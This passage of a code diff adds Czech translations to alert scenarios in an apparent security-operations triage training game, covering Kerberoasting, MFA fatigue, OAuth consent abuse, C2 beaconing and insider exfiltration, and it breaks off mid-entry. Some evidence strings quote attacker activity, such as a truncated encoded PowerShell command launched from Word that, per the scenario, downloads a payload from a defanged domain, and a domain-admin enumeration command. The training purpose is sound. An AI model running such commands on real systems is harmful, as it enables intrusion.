@@ -490,7 +792,24 @@ const ALERTS = [
   required:['block_indicator','add_watchlist'],
   ok:['tune_rule','notify_user'],
   forbidden:['isolate_host','disable_account','close_no_action','reset_password','notify_hr_legal'],
-  debrief:'Malicious, but unsuccessful. Real activity with no impact is still a true positive — block the source, keep watching in case they rotate addresses, and resist disabling thousands of accounts that were never actually compromised.'
+  debrief:'Malicious, but unsuccessful. Real activity with no impact is still a true positive — block the source, keep watching in case they rotate addresses, and resist disabling thousands of accounts that were never actually compromised.',
+  cs:{
+    title:'Password spraying proti VPN portálu',
+    source:'Firewall · Autentizační logy',
+    summary:'Jedna externí adresa zkoušela jedno běžné heslo proti tisícům uživatelských jmen po dobu devadesáti minut. Každý pokus selhal.',
+    evidence:[
+      'První neúspěšná autentizace z 193.32.x.x',
+      '4 182 neúspěšných autentizací, 3 904 unikátních uživatelských jmen',
+      '0 úspěšných autentizací',
+      'Zdrojový ASN označen jako bulletproof hosting ve feedu threat intelligence'
+    ],
+    enrich:[
+      { label:'Potvrdit, že žádné přihlášení neuspělo', result:'Nula úspěchů. Zásada uzamčení účtu zafungovala a na portálu je vynucené MFA.' },
+      { label:'Zkontrolovat vzor seznamu uživatelských jmen', result:'Uživatelská jména mají formát jmeno.prijmeni — pravděpodobně stažená z LinkedIn, ne ukradená z interního zdroje.' },
+      { label:'Prohledat threat intel pro zdrojovou IP', result:'Adresa se objevuje ve třech veřejných feedech pro credential stuffing za poslední týden.' }
+    ],
+    debrief:'Škodlivé, ale neúspěšné. Reálná aktivita bez dopadu je pořád skutečný incident — zablokuj zdroj, sleduj, jestli útočník nezmění adresu, a neblokuj tisíce účtů, které nikdy skutečně kompromitované nebyly.'
+  }
 },
 {
   id:'ALT-4482', sev:'high', target:140,
@@ -516,7 +835,25 @@ const ALERTS = [
   required:['collect_forensics','escalate_ir','reset_password'],
   ok:['disable_account','isolate_host','add_watchlist'],
   forbidden:['tune_rule','close_no_action','notify_user'],
-  debrief:'This is Kerberoasting — cheap to run and devastating if even one of those service accounts has a weak password. Reset the credentials for the harvested accounts, preserve the ticket-request logs, and get IR involved before someone finishes cracking one offline.'
+  debrief:'This is Kerberoasting — cheap to run and devastating if even one of those service accounts has a weak password. Reset the credentials for the harvested accounts, preserve the ticket-request logs, and get IR involved before someone finishes cracking one offline.',
+  cs:{
+    title:'Hromadné požadavky na Kerberos tikety pro všechny servisní účty',
+    source:'Řadič domény · Audit Kerberosu',
+    entities:{ Requests:'214 SPN za 90 s' },
+    summary:'Finanční pracovní stanice si za necelé dvě minuty vyžádala Kerberos service tikety pro 214 servisních účtů — hluboko mimo normální chování aplikací a odpovídá to přípravě na offline lámání hesel.',
+    evidence:[
+      'Event 4769 ×214: TGS požadavky na odlišné SPN od uživatele d.marek',
+      'Všechny požadavky používají šifrování RC4 (slabší, lámatelné offline)',
+      'Na stanici FIN-WS-031 žádná odpovídající aktivita aplikací',
+      'Tři z požadovaných účtů mají lokálního admina na doménových serverech'
+    ],
+    enrich:[
+      { label:'Zkontrolovat požadovaný typ šifrování', result:'Každý tiket byl vyžádán s downgradem na RC4, i když je v celé doméně zapnuté AES — tikety se sbírají pro offline lámání.' },
+      { label:'Zkontrolovat, co uživatel d.marek dělal', result:'d.marek je finanční analytik bez důvodu enumerovat servisní účty; relace nevykazuje žádnou interaktivní aktivitu na klávesnici, odpovídá to skriptovanému nástroji.' },
+      { label:'Zkontrolovat předchozí podobné nárazy', result:'Podobná enumerace SPN se na tomto účtu ani stanici nikdy dřív neobjevila.' }
+    ],
+    debrief:'Tohle je Kerberoasting — levné na spuštění a zničující, pokud má byť jeden z těch servisních účtů slabé heslo. Resetuj přihlašovací údaje sklizených účtů, zachovej logy požadavků na tikety a zapoj IR, než někdo dolomí heslo offline.'
+  }
 },
 {
   id:'ALT-4475', sev:'high', target:140,
@@ -542,7 +879,25 @@ const ALERTS = [
   required:['revoke_sessions','reset_password','notify_user'],
   ok:['disable_account','add_watchlist','escalate_ir','block_indicator'],
   forbidden:['tune_rule','close_no_action','isolate_host'],
-  debrief:'The credential was already stolen; the flood was only about the second factor. Revoke sessions, reset the password, and remove that rogue authenticator — and talk to the user, because "approve to make it stop" is the pattern you want to break tenant-wide.'
+  debrief:'The credential was already stolen; the flood was only about the second factor. Revoke sessions, reset the password, and remove that rogue authenticator — and talk to the user, because "approve to make it stop" is the pattern you want to break tenant-wide.',
+  cs:{
+    title:'Záplava MFA notifikací na účtu ředitelky',
+    source:'Identity protection · MFA telemetrie',
+    entities:{ Result:'1 schváleno' },
+    summary:'Jednomu uživateli bylo za jedenáct minut odesláno šedesát jedna ověřovacích výzev. Poslední byla schválena.',
+    evidence:[
+      'Notifikace #1 — zamítnuta',
+      'Notifikace #2–#60 — zamítnuty nebo vypršely',
+      'Notifikace #61 — SCHVÁLENA · přihlášení z 185.220.x.x (Tor exit node)',
+      'Registrace nové autentizační aplikace na účtu'
+    ],
+    enrich:[
+      { label:'Zkontrolovat, co se stalo po schválení', result:'Útočník si zaregistroval vlastní MFA metodu — teď se může přihlašovat, aniž by znovu obtěžoval uživatele.' },
+      { label:'Zkontrolovat reputaci zdrojové IP', result:'Adresa je známý Tor exit node, na tomto tenantu dosud neviděný.' },
+      { label:'Zavolat uživatelce', result:'Říká, že jí telefon nepřestával vibrovat, tak klepla na schválit, aby to přestalo. Nepřihlašuje se.' }
+    ],
+    debrief:'Přihlašovací údaj byl ukradený už dřív; záplava se týkala jen druhého faktoru. Zneplatni relace, resetuj heslo a odeber ten podvodný autentizátor — a promluv si s uživatelkou, protože vzorec „schválím, ať to přestane“ je potřeba rozbít napříč celým tenantem.'
+  }
 },
 {
   id:'ALT-4483', sev:'medium', target:120,
@@ -568,7 +923,25 @@ const ALERTS = [
   required:['collect_forensics','escalate_ir','block_indicator'],
   ok:['add_watchlist','notify_user'],
   forbidden:['isolate_host','disable_account','reset_password','tune_rule','close_no_action','notify_hr_legal'],
-  debrief:'A misconfiguration is still a breach once someone outside the company actually pulls customer data. Lock down the exposure, preserve the access logs before they roll off, and escalate — this is now an incident with a real download, not a config finding to close quietly.'
+  debrief:'A misconfiguration is still a breach once someone outside the company actually pulls customer data. Lock down the exposure, preserve the access logs before they roll off, and escalate — this is now an incident with a real download, not a config finding to close quietly.',
+  cs:{
+    title:'Cloudové úložiště ponecháno veřejně čitelné',
+    source:'CSPM · Sken cloudové konfigurace',
+    entities:{ Owner:'platformní tým' },
+    summary:'Noční kontrola konfigurace odhalila, že produkční úložiště se zálohami je nastavené na public-read. Přístupové logy ukazují stahování zvenčí firemního rozsahu IP adres ještě předtím, než byla chyba konfigurace odhalena.',
+    evidence:[
+      'CSPM sken hlásí změnu ACL corp-backups-prod na public-read',
+      'Zásada úložiště naposledy změněna před 3 dny v konzoli platformním inženýrem',
+      'Přístupový log: 6 GET požadavků ze 2 IP mimo jakýkoliv známý firemní nebo dodavatelský rozsah',
+      'Mezi staženými objekty je i databázový snapshot z minulého týdne'
+    ],
+    enrich:[
+      { label:'Zkontrolovat, co bylo doopravdy staženo', result:'Jedno z externích stažení stáhlo kompletní databázový snapshot obsahující záznamy zákazníků — nešlo jen o náhodný sken.' },
+      { label:'Zkontrolovat, jak dlouho bylo úložiště vystavené', result:'Úložiště je veřejné už tři dny, od změny určené pro jiné, neprodukční úložiště.' },
+      { label:'Zkontrolovat související change ticket', result:'Change ticket odkazuje na jiný název úložiště — tohle bylo upraveno omylem.' }
+    ],
+    debrief:'Chybná konfigurace je pořád únikem dat, jakmile si někdo zvenčí firmy skutečně stáhne data zákazníků. Uzavři expozici, zachovej přístupové logy dřív, než se odrolují, a eskaluj — tohle je teď incident se skutečným stažením dat, ne konfigurační nález k tichému uzavření.'
+  }
 },
 {
   id:'ALT-4476', sev:'high', target:160,
@@ -594,7 +967,25 @@ const ALERTS = [
   required:['collect_forensics','notify_hr_legal','escalate_ir'],
   ok:['disable_account','add_watchlist','revoke_sessions'],
   forbidden:['notify_user','close_no_action','tune_rule'],
-  debrief:'Insider cases are evidence cases. Preserve first, then hand it to HR and legal, who own what happens next — and do not contact the employee. A warning tips them off and destroys both the evidence and any chance of a clean process.'
+  debrief:'Insider cases are evidence cases. Preserve first, then hand it to HR and legal, who own what happens next — and do not contact the employee. A warning tips them off and destroys both the evidence and any chance of a clean process.',
+  cs:{
+    title:'Hromadné nahrání na osobní cloudové úložiště odcházejícím zaměstnancem',
+    source:'DLP · Monitoring odchozích dat',
+    entities:{ Destination:'Osobní Google Disk' },
+    summary:'Účet ve výpovědní lhůtě nahrál obsah složky s ceníky zákazníků na osobní cloudový účet mimo pracovní dobu.',
+    evidence:[
+      'Přístup na \\\\fs01\\sales\\pricing-2026 (první přístup tohoto uživatele za 9 měsíců)',
+      '8,4 GB nahráno na drive.google.com pod nefiremním účtem',
+      'Připojeno USB úložiště, zapsáno 2,1 GB',
+      'Záznam HR: poslední pracovní den je za 6 dní'
+    ],
+    enrich:[
+      { label:'Zkontrolovat obsah složky', result:'Ceníky zákaznických smluv, slevové matice a cílový seznam pro FY26 — rodinné stříbro obchodního oddělení.' },
+      { label:'Zkontrolovat předchozí podobnou aktivitu', result:'Minulý týden proběhla dvě menší nahrání, obě po 22:00.' },
+      { label:'Zkontrolovat, zda existuje výjimka', result:'Pro tento účet neexistuje žádná schválená výjimka pro přenos dat.' }
+    ],
+    debrief:'Insiderské případy jsou důkazní případy. Nejdřív zachovej důkazy, pak je předej HR a právnímu oddělení, kterým patří další kroky — a nekontaktuj zaměstnance. Varování by ho upozornilo a zničilo by to jak důkazy, tak šanci na čistý proces.'
+  }
 },
 {
   id:'ALT-4484', sev:'low', target:100,
@@ -620,7 +1011,25 @@ const ALERTS = [
   required:['close_no_action','add_watchlist'],
   ok:['notify_user'],
   forbidden:['isolate_host','disable_account','block_indicator','escalate_ir','reset_password','tune_rule'],
-  debrief:'Textbook authorised pentest traffic — everything about the pattern says attacker, but the paperwork says otherwise. Don’t block the vendor’s IP or you’ll be explaining to the account team why their engagement stalled; just keep an eye on it in case anything unexpected strays out of scope.'
+  debrief:'Textbook authorised pentest traffic — everything about the pattern says attacker, but the paperwork says otherwise. Don’t block the vendor’s IP or you’ll be explaining to the account team why their engagement stalled; just keep an eye on it in case anything unexpected strays out of scope.',
+  cs:{
+    title:'Agresivní skenovací provoz proti zákaznickému portálu',
+    source:'IDS · Shoda síťové signatury',
+    entities:{ Signatures:'40+ unikátních' },
+    summary:'Jedna externí IP spustila během pěti minut desítky IDS signatur — SQLi sondy, hrubou sílu na adresáře, header fuzzing — proti zákaznickému portálu v těsném, metodickém vzoru.',
+    evidence:[
+      'IDS: 40+ odlišných útočných signatur z 198.51.100.44 za 5 minut',
+      'Požadavky zahrnují SQLi sondy, pokusy o path traversal a kompletní brute force adresářů',
+      'User-Agent se soustavně hlásí jako známý komerční skenovací nástroj',
+      'Žádný požadavek nedostal odpověď nad HTTP 403'
+    ],
+    enrich:[
+      { label:'Zkontrolovat plán skenování dodavatele', result:'Zdrojová IP odpovídá rozsahu nahlášenému pro letošní čtvrtletní autorizovaný penetrační test, který začal dnes ráno a běží do pátku.' },
+      { label:'Zkontrolovat, zda něco skutečně prošlo', result:'WAF zablokoval každou sondu odpovědí 403; nic se nedostalo do aplikační vrstvy.' },
+      { label:'Zkontrolovat dokumentaci k zakázce', result:'Podepsaná statement of work a žádost o allowlist IP jsou založené u bezpečnostního týmu.' }
+    ],
+    debrief:'Učebnicový provoz autorizovaného pentestu — všechno na tomhle vzoru křičí útočník, ale papíry říkají opak. Neblokuj IP dodavatele, ať pak nevysvětluješ account týmu, proč jejich zakázka zamrzla; jen to sleduj, kdyby něco vybočilo mimo rozsah.'
+  }
 },
 {
   id:'ALT-4477', sev:'medium', target:110,
@@ -646,7 +1055,24 @@ const ALERTS = [
   required:['close_no_action','tune_rule'],
   ok:['notify_user','add_watchlist'],
   forbidden:['isolate_host','disable_account','escalate_ir','notify_hr_legal','reset_password'],
-  debrief:'The tool is genuinely malicious software — the detection was correct, so this is not a false positive. It is authorised activity, which is a different call: verify the exception, document it, and scope the rule to the pentest device group.'
+  debrief:'The tool is genuinely malicious software — the detection was correct, so this is not a false positive. It is authorised activity, which is a different call: verify the exception, document it, and scope the rule to the pentest device group.',
+  cs:{
+    title:'Na notebooku IT administrátora nalezen hackerský nástroj',
+    source:'Antivirus · Shoda signatury HackTool/Mimikatz',
+    summary:'Nástroj na dumpování přihlašovacích údajů byl nalezen ve složce na notebooku patřícím internímu penetračnímu týmu.',
+    evidence:[
+      'Shoda AV signatury: HackTool/Mimikatz v C:\\pentest\\tools\\',
+      'Soubor nespuštěn — detekován při zápisu z interního sdíleného disku',
+      'Stanice patří do AD skupiny „SEC-PENTEST-ENDPOINTS“',
+      'Za poslední hodinu žádná odchozí spojení ze stanice'
+    ],
+    enrich:[
+      { label:'Zkontrolovat interní registr výjimek', result:'Schválená, podepsaná výjimka pokrývá pentestové nástroje na této skupině zařízení až do prosince.' },
+      { label:'Zkontrolovat, zda se soubor spustil', result:'Žádné spuštění, žádný přístup k LSASS, žádné potomkovské procesy. Soubor byl jen zkopírován na disk.' },
+      { label:'Zkontrolovat kalendář zakázek', result:'Tento týden má začít interní red teamová zakázka.' }
+    ],
+    debrief:'Nástroj je opravdu škodlivý software — detekce byla správná, takže tohle není falešný poplach. Je to schválená aktivita, což je jiný verdikt: ověř výjimku, zdokumentuj ji a zúžit rozsah pravidla na skupinu pentestových zařízení.'
+  }
 },
 {
   id:'ALT-4485', sev:'high', target:140,
@@ -672,7 +1098,24 @@ const ALERTS = [
   required:['revoke_sessions','block_indicator','notify_user'],
   ok:['reset_password','add_watchlist','escalate_ir'],
   forbidden:['isolate_host','tune_rule','close_no_action','notify_hr_legal'],
-  debrief:'The password was never needed — OAuth consent handed the attacker durable API access to the mailbox, which a password reset alone would not touch. Revoke the app’s grant and sessions, block it from being consented to again, and warn the 40 people who just received mail from a compromised, trusted account.'
+  debrief:'The password was never needed — OAuth consent handed the attacker durable API access to the mailbox, which a password reset alone would not touch. Revoke the app’s grant and sessions, block it from being consented to again, and warn the 40 people who just received mail from a compromised, trusted account.',
+  cs:{
+    title:'Škodlivá OAuth aplikace získala plný přístup ke schránce',
+    source:'Cloud identity · Audit OAuth aplikací',
+    summary:'Uživatel schválil aplikaci třetí strany po kliknutí na výzvu „převeď svoje PDF“. Aplikace získala plný přístup ke čtení, zápisu a odesílání ve schránce a od té doby nepřestala volat API.',
+    evidence:[
+      'Uživatel udělil souhlas aplikaci „Quick PDF Convert“ (neověřený vydavatel)',
+      'Aplikace zaregistrována před 5 dny, žádá oprávnění Mail.ReadWrite a Mail.Send',
+      'Volání API na Microsoft Graph každých 90 sekund od udělení souhlasu, čtení pošty',
+      'Odchozí e-mail odeslaný přes API na 40 externích adres, neviditelný ve složce Odeslané'
+    ],
+    enrich:[
+      { label:'Zkontrolovat, co aplikace s přístupem dělala', result:'Potichu stahovala poštu a přes API právě odeslala phishingovou zprávu 40 externím kontaktům, obchází složku Odeslané.' },
+      { label:'Zkontrolovat vydavatele a historii aplikace', result:'Neověřený vydavatel, zaregistrováno před pěti dny, žádný jiný tenant ji doposud neschválil.' },
+      { label:'Zavolat uživateli', result:'z.novak si vzpomíná, že odsouhlasil výzvu k oprávněním při pokusu převést PDF z odkazu v textové zprávě.' }
+    ],
+    debrief:'Heslo nebylo vůbec potřeba — souhlas s OAuth dal útočníkovi trvalý API přístup ke schránce, na který samotný reset hesla nedosáhne. Zruš oprávnění aplikace i relace, zablokuj jí možnost znovu získat souhlas a varuj 40 lidí, kteří právě dostali poštu z kompromitovaného, důvěryhodného účtu.'
+  }
 },
 {
   id:'ALT-4478', sev:'critical', target:160,
@@ -698,7 +1141,24 @@ const ALERTS = [
   required:['isolate_host','block_indicator','collect_forensics','escalate_ir'],
   ok:['reset_password','revoke_sessions','disable_account','add_watchlist'],
   forbidden:['tune_rule','close_no_action','notify_user'],
-  debrief:'Active command-and-control with the operator already enumerating privileged groups. Isolate before they move laterally, cut the C2 at the edge, preserve memory while the implant is still resident, and escalate — this is an incident, not a ticket.'
+  debrief:'Active command-and-control with the operator already enumerating privileged groups. Isolate before they move laterally, cut the C2 at the edge, preserve memory while the implant is still resident, and escalate — this is an incident, not a ticket.',
+  cs:{
+    title:'Kódovaný PowerShell komunikuje s neznámým serverem',
+    source:'EDR + síť · Korelovaná detekce',
+    summary:'Base64 kódovaný PowerShell příkaz spuštěný z Wordového dokumentu, následovaný pravidelnými odchozími spojeními v pevných intervalech.',
+    evidence:[
+      'WINWORD.EXE → powershell.exe -enc SQBFAFgAIAAoAE4AZQB3...',
+      'Vytvořena naplánovaná úloha: „MicrosoftEdgeUpdateTaskCore“',
+      'Odchozí spojení na update-svc[.]xyz každých 60 s ±3 s, 412 bajtů',
+      'Spuštěno net group "Domain Admins" /domain'
+    ],
+    enrich:[
+      { label:'Dekódovat PowerShell příkaz', result:'Stahuje a v paměti spouští druhou fázi payloadu z update-svc[.]xyz.' },
+      { label:'Zkontrolovat vzor komunikace', result:'Pevný 60sekundový interval s malým jitterem a konstantní velikostí paketů — učebnicové command-and-control.' },
+      { label:'Zkontrolovat laterální pohyb', result:'Stanice začala enumerovat doménové administrátory. Zatím žádná úspěšná laterální autentizace.' }
+    ],
+    debrief:'Aktivní command-and-control, operátor už enumeruje privilegované skupiny. Izoluj dřív, než se přesune dál, odřízni C2 na perimetru, zachovej paměť, dokud je implantát ještě přítomný, a eskaluj — tohle je incident, ne tiket.'
+  }
 },
 {
   id:'ALT-4486', sev:'critical', target:150,
@@ -724,7 +1184,25 @@ const ALERTS = [
   required:['isolate_host','quarantine_file','collect_forensics'],
   ok:['escalate_ir','block_indicator','disable_account'],
   forbidden:['close_no_action','tune_rule','notify_user'],
-  debrief:'A production database timing out for customers is the business impact; an unpatched management interface is the root cause. Isolate to stop both the mining and the timeouts, pull the binary, and get forensics before you rebuild — then make sure the patch that missed this host actually gets applied everywhere else.'
+  debrief:'A production database timing out for customers is the business impact; an unpatched management interface is the root cause. Isolate to stop both the mining and the timeouts, pull the binary, and get forensics before you rebuild — then make sure the patch that missed this host actually gets applied everywhere else.',
+  cs:{
+    title:'Proces na těžbu kryptoměn zatěžuje CPU na produkčním databázovém serveru',
+    source:'EDR · Anomálie zdrojů a procesů',
+    entities:{ Process:'kswapd0 (maskovaný proces)', CPU:'100 % trvale' },
+    summary:'Proces maskovaný pod názvem kernel vlákna vytížil na dvě hodiny všechna jádra produkčního databázového serveru a připojuje se ven na těžební pool.',
+    evidence:[
+      'Proces „kswapd0“ běží z /tmp, ne z jádra — skutečný kswapd0 nemá spustitelnou cestu',
+      'Vytížení CPU 100 % na všech 16 jádrech od prvního záznamu',
+      'Odchozí TLS spojení na doménu známého těžebního poolu Monero',
+      'Latence databázových dotazů vzrostla 6×, zaznamenány timeouty na straně zákazníků'
+    ],
+    enrich:[
+      { label:'Zkontrolovat, jak se proces dostal na stanici', result:'Byl nasazen přes vystavené správcovské rozhraní databáze s výchozím přihlašovacím údajem, který je pořád aktivní — na všech ostatních stanicích záplatováno před dvěma týdny, jen tady ne.' },
+      { label:'Zkontrolovat spojení na těžební pool', result:'Potvrzený pool Monery, aktivně odesílá shares — právě teď to generuje výnos pro toho, kdo to nasadil.' },
+      { label:'Zkontrolovat laterální šíření', result:'Žádná další stanice v segmentu zatím nevykazuje stejný proces ani odchozí vzor.' }
+    ],
+    debrief:'Produkční databáze s timeouty pro zákazníky je dopad na byznys; nezáplatované správcovské rozhraní je kořenová příčina. Izoluj, ať se zastaví těžba i timeouty, stáhni binárku a udělej forenzní analýzu, než začneš stavět znovu — a ověř, že záplata, která tuhle stanici minula, se skutečně nasadí všude jinde.'
+  }
 },
 {
   id:'ALT-4487', sev:'medium', target:110,
@@ -750,7 +1228,24 @@ const ALERTS = [
   required:['tune_rule','close_no_action'],
   ok:['add_watchlist'],
   forbidden:['isolate_host','disable_account','escalate_ir','quarantine_file','reset_password','notify_hr_legal'],
-  debrief:'Signed, internal, and a repeat offender against the same generic heuristic — this is the AV vendor’s packer problem, not an infection. Submit the hash for allowlisting so the next release doesn’t cost someone else the same twenty minutes.'
+  debrief:'Signed, internal, and a repeat offender against the same generic heuristic — this is the AV vendor’s packer problem, not an infection. Submit the hash for allowlisting so the next release doesn’t cost someone else the same twenty minutes.',
+  cs:{
+    title:'Antivirus označil interní automatizační skript za trojského koně',
+    source:'Antivirus · Heuristická detekce',
+    summary:'Interní ticketovací skript zabalený přes PyInstaller spustil obecnou heuristickou signaturu trojského koně přesně ve chvíli, kdy byl znovu sestavený a nasazený.',
+    evidence:[
+      'Shoda AV signatury: Trojan.GenericKD.<hash> na ticket_sync.py.exe',
+      'Soubor je podepsaný interním inženýrským certifikátem',
+      'Žádná síťová komunikace mimo interní ticketovací API',
+      'Stejná heuristická shoda zaznamenána u předchozí verze o dva releasy zpět, později potvrzena jako čistá'
+    ],
+    enrich:[
+      { label:'Zkontrolovat podpis kódu a historii hashů', result:'Podepsáno interním certifikátem a stejná obecná heuristika už dala falešný poplach u posledních tří PyInstaller sestavení přesně tohoto nástroje.' },
+      { label:'Zkontrolovat, co skript skutečně dělá', result:'Zdrojový kód je v interním repozitáři — jen čte a zapisuje tikety přes interní API, nic připomínající chování trojského koně.' },
+      { label:'Zkontrolovat poznámky výrobce AV k detekci', result:'Obecná heuristika výrobce je známá přehnaným spouštěním na Python binárkách zabalených PyInstallerem; existuje proces pro zařazení na allowlist.' }
+    ],
+    debrief:'Podepsané, interní a opakovaný pachatel proti té samé obecné heuristice — tohle je problém balíčkovače výrobce AV, ne infekce. Pošli hash na allowlisting, ať příští release nestojí někoho dalšího stejných dvacet minut.'
+  }
 },
 {
   id:'ALT-4479', sev:'critical', target:150,
@@ -776,7 +1271,24 @@ const ALERTS = [
   required:['escalate_ir','disable_account','collect_forensics'],
   ok:['revoke_sessions','reset_password','isolate_host','add_watchlist','notify_user'],
   forbidden:['tune_rule','close_no_action'],
-  debrief:'Someone has the service account credential and is building persistence. Disable the account they created, page IR, and preserve the domain controller logs. Killing svc-backup itself can take backups down, so that call belongs to IR and the platform owner together — knowing what your containment breaks is part of the job.'
+  debrief:'Someone has the service account credential and is building persistence. Disable the account they created, page IR, and preserve the domain controller logs. Killing svc-backup itself can take backups down, so that call belongs to IR and the platform owner together — knowing what your containment breaks is part of the job.',
+  cs:{
+    title:'Servisní účet vytvořil nového doménového administrátora',
+    source:'Active Directory · Audit log',
+    summary:'Zálohovací servisní účet, který nikdy dřív nevytvořil žádný objekt, ve čtyři ráno vytvořil uživatele a přidal ho do Domain Admins.',
+    evidence:[
+      'Kerberos TGT pro svc-backup z podsítě pracovních stanic (běžně jen z podsítě DC)',
+      'Event 4720: uživatelský účet adm_support01 vytvořen účtem svc-backup',
+      'Event 4728: adm_support01 přidán do Domain Admins',
+      'Heslo účtu svc-backup naposledy změněno před 1 340 dny'
+    ],
+    enrich:[
+      { label:'Zkontrolovat, odkud se svc-backup autentizoval', result:'Z uživatelské pracovní stanice, ne ze zálohovací infrastruktury — přihlašovací údaj servisního účtu používá někdo jiný.' },
+      { label:'Zkontrolovat change request', result:'Pro vytvoření administrátorského účtu dnes v noci neexistuje žádný change ticket.' },
+      { label:'Zkontrolovat, co nový účet stihl udělat', result:'adm_support01 se zatím nepřihlásil. Vypadá to jako příprava persistence na později.' }
+    ],
+    debrief:'Někdo má přihlašovací údaj servisního účtu a buduje si persistenci. Zablokuj účet, který vytvořil, zavolej IR a zachovej logy řadiče domény. Vypnutí samotného svc-backup může položit zálohování, takže to rozhodnutí patří společně IR a vlastníkovi platformy — vědět, co tvoje zadržení rozbije, je součást téhle práce.'
+  }
 },
 {
   id:'ALT-4492', sev:'high', target:130,
@@ -802,7 +1314,24 @@ const ALERTS = [
   required:['close_no_action','add_watchlist'],
   ok:['notify_user'],
   forbidden:['isolate_host','disable_account','escalate_ir','block_indicator','collect_forensics','reset_password'],
-  debrief:'The detection did exactly its job — this really does look like C2, because it is, just the authorised kind. Purple team week means checking the rules of engagement before you contain anything on the in-scope host list; log it, watch it, and save the real response for what falls outside scope.'
+  debrief:'The detection did exactly its job — this really does look like C2, because it is, just the authorised kind. Purple team week means checking the rules of engagement before you contain anything on the in-scope host list; log it, watch it, and save the real response for what falls outside scope.',
+  cs:{
+    title:'Vzor beaconu odpovídá red-teamové infrastruktuře uprostřed purple-teamové zakázky',
+    source:'Síťová detekce · Heuristika C2 beaconu',
+    summary:'Pracovní stanice začala každých 45 sekund odesílat beacon na doménu odpovídající signatuře komerčních C2 frameworků — přesně v týdnu, kdy bezpečnostní tým naplánoval purple-teamovou zakázku.',
+    evidence:[
+      'Odchozí beacon každých 45 s ±2 s na rt-infra-042[.]internal-test',
+      'JA3 fingerprint odpovídá známému komerčnímu red-teamovému C2 frameworku',
+      'Stanice je zařazena v AD skupině „SEC-PURPLETEAM-SCOPE“',
+      'Nezaznamenán žádný přístup k přihlašovacím údajům ani pokus o laterální pohyb'
+    ],
+    enrich:[
+      { label:'Zkontrolovat pravidla zakázky (rules of engagement)', result:'Podepsaná pravidla zakázky uvádějí přesně tuto stanici a C2 doménu jako součást rozsahu purple-teamové zakázky běžící tento týden, s definovaným koncem.' },
+      { label:'Zkontrolovat vlastníka stanice', result:'Zařízení patří členovi interního red teamu, přihlášenému pod jeho provozním účtem.' },
+      { label:'Napsat koordinátorovi zakázky', result:'Koordinátor potvrzuje, že beacon je jejich, a žádá, aby detekce normálně logovaly bez spouštění zadržovacích akcí, dle plánu.' }
+    ],
+    debrief:'Detekce udělala přesně to, co měla — tohle vážně vypadá jako C2, protože to C2 je, jen tou schválenou verzí. Týden purple teamu znamená zkontrolovat pravidla zakázky dřív, než začneš zadržovat cokoliv na seznamu stanic v rozsahu; zaloguj to, sleduj to a skutečnou reakci si nech na to, co je mimo rozsah.'
+  }
 },
 {
   id:'ALT-4488', sev:'high', target:150,
@@ -828,7 +1357,25 @@ const ALERTS = [
   required:['disable_account','revoke_sessions','collect_forensics'],
   ok:['notify_hr_legal','escalate_ir','add_watchlist'],
   forbidden:['close_no_action','tune_rule','notify_user'],
-  debrief:'A broken offboarding step, not a hacked account — but the access and the download are real and happened after termination. Cut the credential now, preserve what was accessed for HR and legal, and flag the gap in the offboarding process before the next departure slips through the same crack.'
+  debrief:'A broken offboarding step, not a hacked account — but the access and the download are real and happened after termination. Cut the credential now, preserve what was accessed for HR and legal, and flag the gap in the offboarding process before the next departure slips through the same crack.',
+  cs:{
+    title:'VPN i přístupová karta propuštěného zaměstnance použity po jeho posledním dni',
+    source:'Korelace identity a fyzického přístupu',
+    entities:{ Terminated:'včera, 17:00', Access:'VPN + karta, 03:10' },
+    summary:'HR včera večer zpracovalo okamžité ukončení pracovního poměru. Přes noc byly stejné přihlašovací údaje použity k připojení na VPN a průchodu kartou do budovy a byly otevřeny soubory na oddělovém sdíleném disku.',
+    evidence:[
+      'Systém HR: p.krejci označen jako ukončený, otevřen offboardingový tiket',
+      'Úspěšná VPN autentizace uživatele p.krejci (krok zablokování účtu stále otevřený, nezpracovaný)',
+      'Průchod kartou u západního vchodu, 3. patro',
+      'Přístup na \\\\fs02\\engineering\\roadmap — první přístup tohoto účtu za 4 měsíce'
+    ],
+    enrich:[
+      { label:'Zkontrolovat stav offboardingového tiketu', result:'Krok zablokování účtu v offboardingovém tiketu nebyl nikdy dokončen — fronta IT je přetížená a přihlašovací údaj nebyl nikdy skutečně zneplatněn.' },
+      { label:'Zkontrolovat, co bylo otevřeno', result:'Byl otevřen sdílený disk s roadmapou vývoje a lokálně staženy dva dokumenty.' },
+      { label:'Porovnat log karet s obsazeností budovy', result:'Nikdo jiný tím vchodem v okolní hodině neprošel — odpovídá to tomu, že přihlašovací údaj používá jeho vlastník, ne sdílená nebo ukradená karta.' }
+    ],
+    debrief:'Rozbitý krok offboardingu, ne hacknutý účet — ale přístup a stažení jsou skutečné a stalo se to po ukončení poměru. Zablokuj přihlašovací údaj hned teď, zachovej, co bylo otevřeno, pro HR a právní oddělení, a nahlas mezeru v offboardingovém procesu, než jí propadne další odchod.'
+  }
 },
 {
   id:'ALT-4489', sev:'low', target:100,
@@ -854,7 +1401,25 @@ const ALERTS = [
   required:['tune_rule','close_no_action'],
   ok:['notify_user'],
   forbidden:['block_indicator','disable_account','isolate_host','escalate_ir','notify_hr_legal','reset_password'],
-  debrief:'Authenticated, expected, and sent by the people who say they sent it — the bulk-mail heuristic just can’t tell a town hall invite from a newsletter. Release the quarantined copies and add an allow entry for the comms platform so this stops costing someone a ticket every few weeks.'
+  debrief:'Authenticated, expected, and sent by the people who say they sent it — the bulk-mail heuristic just can’t tell a town hall invite from a newsletter. Release the quarantined copies and add an allow entry for the comms platform so this stops costing someone a ticket every few weeks.',
+  cs:{
+    title:'Celofiremní pozvánka na town hall zablokována jako spam',
+    source:'Secure email gateway · Filtr hromadné pošty',
+    entities:{ Action:'Karanténováno' },
+    summary:'Heuristika hromadné pošty na gateway zablokovala interní oznámení o town hallu odeslané celé firmě, protože obsahovalo trackovací pixely a vysoký poměr odkazů k textu typický pro marketingový spam.',
+    evidence:[
+      'Zpráva od comms@corp.example na distribuční seznam všech zaměstnanců',
+      'Skóre gateway: 8,4/10 spam — vysoká hustota odkazů, trackovací pixel, vzor hromadného odesílání',
+      'SPF, DKIM i DMARC pro odesílající doménu v pořádku',
+      'Otevřen helpdeskový tiket: „pozvánka na town hall nikdy nedorazila“'
+    ],
+    enrich:[
+      { label:'Zkontrolovat výsledky autentizace', result:'Plně autentizováno, odesláno z firemní komunikační platformy, kterou všichni znají — obsah jen strukturně připomíná marketingovou poštu.' },
